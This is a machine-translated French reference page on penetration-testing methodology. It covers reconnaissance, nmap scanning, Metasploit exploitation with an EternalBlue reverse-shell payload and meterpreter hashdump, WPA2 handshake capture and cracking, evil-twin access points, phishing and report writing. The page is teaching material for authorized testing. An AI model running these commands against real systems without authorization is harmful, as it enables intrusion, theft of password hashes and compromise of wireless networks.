---
title: "Méthodologie de test d'intrusion"
category: techniques
tags: [security, pentesting, reconnaissance, exploitation, metasploit, nmap]
level: 3
source_sha256: 680bd03966524cf720e37019447dfe8e29bda3821286f218011f776e0a392731
translation: machine
translated_at: '2026-10-24'
---
# Méthodologie de test d'intrusion {#penetration-testing-methodology}

Workflow de bout en bout pour le test d'intrusion : reconnaissance (passive et active), scan, exploitation avec Metasploit, post-exploitation et rédaction professionnelle du rapport. Couvre les vecteurs d'attaque sur l'infrastructure, le réseau et le sans-fil.

## Points clés {#key-facts}
- Phases du test d'intrusion : Recon -> Scan -> Exploitation -> Post-exploitation -> Rapport
- La reconnaissance passive (Shodan, DNS, OSINT) n'est pas détectable par la cible
- Le scan SYN de nmap (`-sS`) est le scan furtif par défaut avec les privilèges root
- Les payloads Metasploit en mode staged sont plus petits mais nécessitent un callback ; les stageless sont autonomes
- Les reverse shells contournent les pare-feu entrants (la cible se connecte à l'attaquant)
- Structure du rapport : Résumé exécutif -> Périmètre -> Constats (triés par sévérité) -> Preuves -> Remédiation

## Reconnaissance {#reconnaissance}

### Passive (sans contact avec la cible) {#passive-no-target-contact}
```bash
# DNS enumeration
dig example.com ANY
dig axfr @ns1.example.com example.com   # Zone transfer attempt
dnsenum example.com

# Subdomain discovery
sublist3r -d example.com
amass enum -d example.com

# Email/IP harvesting
theHarvester -d example.com -b google,bing,linkedin -l 500
```

Autres sources passives : Shodan, Certificate Transparency (crt.sh), WHOIS, Google Dorking (`site:example.com filetype:pdf`).

### Active (détectable) {#active-detectable}
Scan de ports, collecte de bannières, brute-force de répertoires :
```bash
# Directory enumeration
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
ffuf -w wordlist.txt -u http://target.com/FUZZ
```

## Scan {#scanning}

### nmap {#nmap}
```bash
nmap -sS target              # SYN scan (stealth, requires root)
nmap -sT target              # TCP connect (no root needed)
nmap -sU target              # UDP scan
nmap -sV target              # Service version detection
nmap -O target               # OS detection
nmap -A target               # Aggressive (OS + version + scripts + traceroute)
nmap -p- target              # All 65535 ports
nmap -sn 10.0.0.0/24        # Host discovery only (ping sweep)
nmap -Pn target              # Skip host discovery

# NSE Scripts
nmap --script vuln target                    # All vulnerability scripts
nmap --script smb-vuln-ms17-010 target       # Specific CVE check
nmap --script http-enum target               # HTTP directory enum
nmap --script "smb-*" target                 # All SMB scripts
```

### Scan de vulnérabilités {#vulnerability-scanning}
- **Nessus** - commercial, le plus largement utilisé
- **OpenVAS/GVM** - alternative open source
- Les scans authentifiés sont bien plus complets que les scans non authentifiés
- La gestion des faux positifs est essentielle : vérifier avant de rapporter

## Exploitation {#exploitation}

### Framework Metasploit {#metasploit-framework}
```bash
msfconsole
search ms17_010
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 10.0.0.5
set LHOST 10.0.0.1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

# Meterpreter post-exploitation
sysinfo                              # System info
getuid / getsystem                   # Current user / privesc attempt
hashdump                             # Dump password hashes
shell                                # OS shell
upload /local/file /remote/path
download /remote/file /local/path
portfwd add -l 8080 -p 80 -r 10.0.0.10   # Port forwarding
```

### Types de payloads {#payload-types}
- **Staged** (`windows/meterpreter/reverse_tcp`) - un petit stager télécharge le payload complet
- **Stageless** (`windows/meterpreter_reverse_tcp`) - payload complet dans un seul binaire
- **Reverse shell** - la cible se reconnecte à l'attaquant (contourne le pare-feu entrant)
- **Bind shell** - la cible ouvre un port, l'attaquant s'y connecte

## Attaques sans-fil {#wireless-attacks}

### Cassage WPA2 {#wpa2-cracking}
```bash
airmon-ng start wlan0                           # Monitor mode
airodump-ng wlan0mon                            # Discover networks
airodump-ng -c CHANNEL --bssid BSSID -w capture wlan0mon  # Target capture
aireplay-ng -0 5 -a BSSID wlan0mon             # Deauth (force handshake)
aircrack-ng -w wordlist.txt capture-01.cap     # Crack

# GPU-accelerated cracking
hcxpcapngtool capture-01.cap -o hash.hc22000
hashcat -m 22000 hash.hc22000 wordlist.txt
```

### Rogue AP / Evil Twin {#rogue-ap-evil-twin}
Cloner le SSID d'un point d'accès légitime et servir un portail captif pour capturer les identifiants. Outils : hostapd + dnsmasq.

## Ingénierie sociale {#social-engineering}
- **Spear phishing** - e-mails ciblés contenant des liens ou pièces jointes malveillants
- **Whaling** - ciblage des dirigeants
- **Vishing** - ingénierie sociale par téléphone
- **Pretexting** - scénario fabriqué (usurpation d'un service informatique ou d'un fournisseur)
- Outils : GoPhish, King Phisher

## Rédaction du rapport {#report-writing}

### Sévérité des constats {#finding-severity}
| Sévérité | Exemples |
|----------|----------|
| Critique | RCE, contournement d'authentification, compromission de domain admin |
| Élevée | Élévation de privilèges, exposition de données sensibles, SQLi |
| Moyenne | XSS stocké, CSRF, divulgation d'informations |
| Faible | En-têtes manquants, erreurs verbeuses, logiciel obsolète (sans exploit connu) |
| Info | Recommandations de bonnes pratiques |

Chaque constat doit comporter : une description, le risque métier, une remédiation pas à pas et les étapes de vérification.

## Pièges à éviter {#gotchas}
- Toujours disposer d'une autorisation écrite (périmètre, règles d'engagement) avant de tester
- L'exploitation d'une vulnérabilité peut faire planter le service : tester pendant les fenêtres de maintenance lorsque c'est possible
- Les payloads Metasploit par défaut sont détectés par la plupart des antivirus et EDR : des payloads personnalisés ou encodés sont nécessaires pour les missions réelles
- Les scans nmap non authentifiés manquent de nombreuses vulnérabilités que les scans authentifiés détectent
- Le scan réseau peut déclencher des alertes IDS/IPS et des blocages automatiques (fail2ban)

## Voir aussi {#see-also}
- [[privilege-escalation-techniques]] - Élévation de privilèges sous Linux et Windows
- [[active-directory-attacks]] - Chemins d'attaque spécifiques à AD
- [[burp-suite-and-web-pentesting]] - Tests d'applications web
- [[osint-and-reconnaissance]] - Collecte d'informations passive
